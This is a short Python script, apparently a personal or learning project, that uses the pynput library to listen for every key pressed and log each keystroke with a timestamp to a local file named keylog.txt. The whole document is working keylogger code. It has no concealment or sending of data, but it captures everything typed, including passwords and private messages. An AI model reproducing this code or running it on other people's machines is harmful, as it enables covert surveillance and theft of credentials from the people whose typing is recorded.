import logging
from pynput.keyboard import Key, Listener
import os

# Set up logging
log_dir = r"C:/Users/Zumo/PycharmProjects/2024"
log_file = os.path.join(log_dir, "keylog.txt")

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to handle key presses
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start the key listener
with Listener(on_press=on_press) as listener:
    listener.join()

